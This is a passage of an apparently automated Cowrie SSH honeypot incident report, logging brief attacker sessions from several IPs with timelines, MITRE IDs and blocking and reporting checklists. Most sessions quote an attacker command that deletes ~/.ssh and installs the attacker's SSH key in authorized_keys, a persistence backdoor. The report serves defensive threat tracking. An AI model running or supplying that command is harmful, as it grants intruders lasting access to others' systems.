| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:27:48` | `cowrie.session.connect` |
| `2026-04-14 08:27:48` | `cowrie.client.version` |
| `2026-04-14 08:27:48` | `cowrie.client.kex` |
| `2026-04-14 08:27:49` | `cowrie.login.success` |
| `2026-04-14 08:27:50` | `cowrie.session.params` |
| `2026-04-14 08:27:50` | `cowrie.command.input` |
| `2026-04-14 08:27:50` | `cowrie.command.failed` |
| `2026-04-14 08:27:50` | `cowrie.log.closed` |
| `2026-04-14 08:27:51` | `cowrie.session.params` |
| `2026-04-14 08:27:51` | `cowrie.command.input` |
| `2026-04-14 08:27:51` | `cowrie.session.file_download` |
| `2026-04-14 08:27:51` | `cowrie.log.closed` |
| `2026-04-14 08:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ada2a81fd6fa

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:27 |
| **Last Seen** | 2026-04-14 08:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:27:54` | `cowrie.session.connect` |
| `2026-04-14 08:27:54` | `cowrie.client.version` |
| `2026-04-14 08:27:54` | `cowrie.client.kex` |
| `2026-04-14 08:27:55` | `cowrie.login.success` |
| `2026-04-14 08:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55eebad850a8

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:28 |
| **Last Seen** | 2026-04-14 08:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:28:05` | `cowrie.session.connect` |
| `2026-04-14 08:28:05` | `cowrie.client.version` |
| `2026-04-14 08:28:05` | `cowrie.client.kex` |
| `2026-04-14 08:28:06` | `cowrie.login.success` |
| `2026-04-14 08:28:06` | `cowrie.session.params` |
| `2026-04-14 08:28:06` | `cowrie.command.input` |
| `2026-04-14 08:28:06` | `cowrie.command.failed` |
| `2026-04-14 08:28:06` | `cowrie.log.closed` |
| `2026-04-14 08:28:07` | `cowrie.session.params` |
| `2026-04-14 08:28:07` | `cowrie.command.input` |
| `2026-04-14 08:28:07` | `cowrie.session.file_download` |
| `2026-04-14 08:28:07` | `cowrie.log.closed` |
| `2026-04-14 08:28:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11f1c9e81c2d

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:28 |
| **Last Seen** | 2026-04-14 08:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:28:09` | `cowrie.session.connect` |
| `2026-04-14 08:28:09` | `cowrie.client.version` |
| `2026-04-14 08:28:09` | `cowrie.client.kex` |
| `2026-04-14 08:28:10` | `cowrie.login.success` |
| `2026-04-14 08:28:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-506daa33d8c6

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:29 |
| **Last Seen** | 2026-04-14 08:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:29:19` | `cowrie.session.connect` |
| `2026-04-14 08:29:19` | `cowrie.client.version` |
| `2026-04-14 08:29:19` | `cowrie.client.kex` |
| `2026-04-14 08:29:19` | `cowrie.login.success` |
| `2026-04-14 08:29:20` | `cowrie.session.params` |
| `2026-04-14 08:29:20` | `cowrie.command.input` |
| `2026-04-14 08:29:20` | `cowrie.command.failed` |
| `2026-04-14 08:29:20` | `cowrie.log.closed` |
| `2026-04-14 08:29:20` | `cowrie.session.params` |
| `2026-04-14 08:29:20` | `cowrie.command.input` |
| `2026-04-14 08:29:20` | `cowrie.session.file_download` |
| `2026-04-14 08:29:20` | `cowrie.log.closed` |
| `2026-04-14 08:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9c1d78b0c37

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:29 |
| **Last Seen** | 2026-04-14 08:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:29:22` | `cowrie.session.connect` |
| `2026-04-14 08:29:22` | `cowrie.client.version` |
| `2026-04-14 08:29:22` | `cowrie.client.kex` |
| `2026-04-14 08:29:23` | `cowrie.login.success` |
| `2026-04-14 08:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0271ecc64958

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:29 |
| **Last Seen** | 2026-04-14 08:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:29:42` | `cowrie.session.connect` |
| `2026-04-14 08:29:42` | `cowrie.client.version` |
| `2026-04-14 08:29:42` | `cowrie.client.kex` |
| `2026-04-14 08:29:43` | `cowrie.login.success` |
| `2026-04-14 08:29:43` | `cowrie.session.params` |
| `2026-04-14 08:29:43` | `cowrie.command.input` |
| `2026-04-14 08:29:43` | `cowrie.command.failed` |
| `2026-04-14 08:29:43` | `cowrie.log.closed` |
| `2026-04-14 08:29:43` | `cowrie.session.params` |
| `2026-04-14 08:29:43` | `cowrie.command.input` |
| `2026-04-14 08:29:43` | `cowrie.session.file_download` |
| `2026-04-14 08:29:43` | `cowrie.log.closed` |
| `2026-04-14 08:29:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcd3737ce29f

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:29 |
| **Last Seen** | 2026-04-14 08:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:29:46` | `cowrie.session.connect` |
| `2026-04-14 08:29:46` | `cowrie.client.version` |
| `2026-04-14 08:29:46` | `cowrie.client.kex` |
| `2026-04-14 08:29:46` | `cowrie.login.success` |
| `2026-04-14 08:29:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e95ce986f00

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:29 |
| **Last Seen** | 2026-04-14 08:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:29:57` | `cowrie.session.connect` |
| `2026-04-14 08:29:57` | `cowrie.client.version` |
| `2026-04-14 08:29:57` | `cowrie.client.kex` |
| `2026-04-14 08:29:57` | `cowrie.login.success` |
| `2026-04-14 08:29:58` | `cowrie.session.params` |
| `2026-04-14 08:29:58` | `cowrie.command.input` |
| `2026-04-14 08:29:58` | `cowrie.command.failed` |
| `2026-04-14 08:29:58` | `cowrie.log.closed` |
| `2026-04-14 08:29:59` | `cowrie.session.params` |
| `2026-04-14 08:29:59` | `cowrie.command.input` |
| `2026-04-14 08:29:59` | `cowrie.session.file_download` |
| `2026-04-14 08:29:59` | `cowrie.log.closed` |
| `2026-04-14 08:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c484c7065b56

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:30 |
| **Last Seen** | 2026-04-14 08:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:30:01` | `cowrie.session.connect` |
| `2026-04-14 08:30:01` | `cowrie.client.version` |
| `2026-04-14 08:30:01` | `cowrie.client.kex` |
| `2026-04-14 08:30:03` | `cowrie.login.success` |
| `2026-04-14 08:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-211d3633de3e

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:30 |
| **Last Seen** | 2026-04-14 08:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:30:28` | `cowrie.session.connect` |
| `2026-04-14 08:30:28` | `cowrie.client.version` |
| `2026-04-14 08:30:28` | `cowrie.client.kex` |
| `2026-04-14 08:30:29` | `cowrie.login.success` |
| `2026-04-14 08:30:29` | `cowrie.session.params` |
| `2026-04-14 08:30:29` | `cowrie.command.input` |
| `2026-04-14 08:30:29` | `cowrie.command.failed` |
| `2026-04-14 08:30:30` | `cowrie.log.closed` |
| `2026-04-14 08:30:31` | `cowrie.session.params` |
| `2026-04-14 08:30:31` | `cowrie.command.input` |
| `2026-04-14 08:30:31` | `cowrie.session.file_download` |
| `2026-04-14 08:30:31` | `cowrie.log.closed` |
| `2026-04-14 08:30:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52212713d826

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:30 |
| **Last Seen** | 2026-04-14 08:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:30:35` | `cowrie.session.connect` |
| `2026-04-14 08:30:35` | `cowrie.client.version` |
| `2026-04-14 08:30:35` | `cowrie.client.kex` |
| `2026-04-14 08:30:35` | `cowrie.login.success` |
| `2026-04-14 08:30:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c89dbdd6009

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:31 |
| **Last Seen** | 2026-04-14 08:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:31:00` | `cowrie.session.connect` |
| `2026-04-14 08:31:00` | `cowrie.client.version` |
| `2026-04-14 08:31:01` | `cowrie.client.kex` |
| `2026-04-14 08:31:01` | `cowrie.login.success` |
| `2026-04-14 08:31:01` | `cowrie.session.params` |
| `2026-04-14 08:31:01` | `cowrie.command.input` |
| `2026-04-14 08:31:01` | `cowrie.command.failed` |
| `2026-04-14 08:31:02` | `cowrie.log.closed` |
| `2026-04-14 08:31:02` | `cowrie.session.params` |
| `2026-04-14 08:31:02` | `cowrie.command.input` |
| `2026-04-14 08:31:02` | `cowrie.session.file_download` |
| `2026-04-14 08:31:02` | `cowrie.log.closed` |
| `2026-04-14 08:31:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fce3e29c763e

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:31 |
| **Last Seen** | 2026-04-14 08:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:31:04` | `cowrie.session.connect` |
| `2026-04-14 08:31:04` | `cowrie.client.version` |
| `2026-04-14 08:31:04` | `cowrie.client.kex` |
| `2026-04-14 08:31:05` | `cowrie.login.success` |
| `2026-04-14 08:31:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-358dfba41b82

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:31 |
| **Last Seen** | 2026-04-14 08:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:31:48` | `cowrie.session.connect` |
| `2026-04-14 08:31:48` | `cowrie.client.version` |
| `2026-04-14 08:31:48` | `cowrie.client.kex` |
| `2026-04-14 08:31:50` | `cowrie.login.success` |
| `2026-04-14 08:31:50` | `cowrie.session.params` |
| `2026-04-14 08:31:50` | `cowrie.command.input` |
| `2026-04-14 08:31:50` | `cowrie.command.failed` |
| `2026-04-14 08:31:51` | `cowrie.log.closed` |
| `2026-04-14 08:31:53` | `cowrie.session.params` |
| `2026-04-14 08:31:53` | `cowrie.command.input` |
| `2026-04-14 08:31:53` | `cowrie.session.file_download` |
| `2026-04-14 08:31:53` | `cowrie.log.closed` |
| `2026-04-14 08:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84c8ad7435eb

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]16` |
| **First Seen** | 2026-04-14 08:31 |
| **Last Seen** | 2026-04-14 08:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:31:55` | `cowrie.session.connect` |
| `2026-04-14 08:31:55` | `cowrie.client.version` |
| `2026-04-14 08:31:56` | `cowrie.client.kex` |
| `2026-04-14 08:31:56` | `cowrie.login.success` |
| `2026-04-14 08:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]16` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a463ac3ac666

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:32 |
| **Last Seen** | 2026-04-14 08:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:32:10` | `cowrie.session.connect` |
| `2026-04-14 08:32:10` | `cowrie.client.version` |
| `2026-04-14 08:32:10` | `cowrie.client.kex` |
| `2026-04-14 08:32:11` | `cowrie.login.success` |
| `2026-04-14 08:32:12` | `cowrie.session.params` |
| `2026-04-14 08:32:12` | `cowrie.command.input` |
